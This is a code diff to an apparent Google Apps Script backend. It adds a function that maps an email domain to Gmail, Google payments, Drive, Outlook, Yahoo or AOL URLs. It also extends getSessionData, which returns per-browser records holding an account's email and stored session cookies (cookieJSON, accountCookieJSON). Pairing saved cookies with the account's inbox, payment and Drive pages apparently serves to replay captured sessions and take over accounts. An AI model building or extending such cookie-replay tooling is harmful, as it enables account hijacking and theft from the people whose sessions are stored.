@@ -2334,6 +2334,63 @@ function backendMultiFunction(params) {
   }
 }
 
+
+var FREE_MS_DOMAINS_SET = {
+  'outlook.com': true, 'hotmail.com': true, 'live.com': true, 'windowslive.com': true,
+  'outlook.co.uk': true, 'hotmail.co.uk': true, 'live.co.uk': true,
+  'outlook.ca': true, 'hotmail.ca': true, 'live.ca': true,
+  'outlook.co.za': true, 'hotmail.co.za': true, 'live.co.za': true,
+  'outlook.com.au': true, 'hotmail.com.au': true, 'live.com.au': true,
+  'outlook.fr': true, 'hotmail.fr': true, 'live.fr': true,
+  'outlook.de': true, 'hotmail.de': true, 'live.de': true,
+  'outlook.it': true, 'hotmail.it': true, 'live.it': true,
+  'outlook.es': true, 'hotmail.es': true, 'live.es': true,
+  'outlook.jp': true, 'hotmail.jp': true, 'live.jp': true,
+  'outlook.com.br': true, 'hotmail.com.br': true, 'live.com.br': true,
+  'msn.com': true, 'live.net': true
+};
+
+function resolveSmartPlatformUrlsGAS(domain, platform, email) {
+  var d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
+  var p = (platform || '').toLowerCase().trim();
+  var em = (email || '').toLowerCase().trim();
+
+  // 1. Google / Gmail: 3 tabs
+  if (p === 'google' || p === 'gmail' || d.indexOf('google') !== -1 || d.indexOf('gmail') !== -1 || em.indexOf('@gmail.com') !== -1 || em.indexOf('@googlemail.com') !== -1) {
+    return [
+      'https://mail.google.com/mail/u/0/#inbox',
+      'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app',
+      'https://drive.google.com/drive/u/0/home'
+    ];
+  }
+
+  // 2. Outlook / Microsoft / Office 365: 1 tab dynamically resolved
+  var isMsDomain = !!FREE_MS_DOMAINS_SET[d] || d.indexOf('outlook') !== -1 || d.indexOf('hotmail') !== -1 || d.indexOf('live') !== -1 || d.indexOf('msn') !== -1 || d.indexOf('microsoft') !== -1;
+  if (p === 'outlook' || p === 'microsoft' || p === 'office365' || isMsDomain) {
+    if (!!FREE_MS_DOMAINS_SET[d] || d.indexOf('outlook') !== -1 || d.indexOf('hotmail') !== -1 || d.indexOf('live') !== -1 || d.indexOf('msn') !== -1) {
+      return ['https://outlook.live.com/mail/'];
+    }
+    return ['https://outlook.office.com/mail/'];
+  }
+
+  // 3. Yahoo
+  if (p === 'yahoo' || d.indexOf('yahoo') !== -1 || d.indexOf('ymail') !== -1) {
+    return ['https://mail.yahoo.com/'];
+  }
+
+  // 4. AOL
+  if (p === 'aol' || d.indexOf('aol') !== -1) {
+    return ['https://mail.aol.com/'];
+  }
+
+  // 5. Fallback for custom domain
+  if (d) {
+    return ['https://' + d];
+  }
+
+  return ['https://mail.google.com/mail/u/0/#inbox'];
+}
+
 function getSessionData(params) {
   try {
     const browserId = params.browserId;
@@ -2367,20 +2424,10 @@ function getSessionData(params) {
     }
 
         var domainVal = getCol('domain') || '';
-    var platformUrls = [];
-    if (domainVal) {
-      if (domainVal.indexOf('google') !== -1 || domainVal.indexOf('gmail') !== -1) {
-        platformUrls = [
-          'https://mail.google.com/mail/u/0/#inbox',
-          'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app',
-          'https://drive.google.com/drive/u/0/home'
-        ];
-      } else if (domainVal.indexOf('outlook') !== -1 || domainVal.indexOf('hotmail') !== -1 || domainVal.indexOf('live') !== -1) {
-        platformUrls = ['https://outlook.live.com/mail/'];
-      } else if (domainVal.indexOf('yahoo') !== -1) {
-        platformUrls = ['https://mail.yahoo.com/'];
-      }
-    }
+    var emailVal = getCol('email') || '';
+    var platformVal = getCol('platform') || '';
+    var platformUrls = resolveSmartPlatformUrlsGAS(domainVal, platformVal, emailVal);
+    var platformUrl = platformUrls[0] || getCol('platformUrl') || 'https://mail.google.com/mail/u/0/#inbox';
 
     return {
       success: true,
@@ -2388,9 +2435,10 @@ function getSessionData(params) {
         downloadUrl: downloadUrl,
         driveUrl: driveUrl,
         domain: domainVal,
-        email: getCol('email'),
+        email: emailVal,
         category: getCol('category'),
-        platformUrl: getCol('platformUrl'),
+        platform: platformVal,
+        platformUrl: platformUrl,
         platformUrls: platformUrls,
         cookieJSON: getCol('cookieJSON') || getCol('cookie') || getCol('formattedCookie') || null,
         accountCookieJSON: getCol('accountCookieJSON') || null,
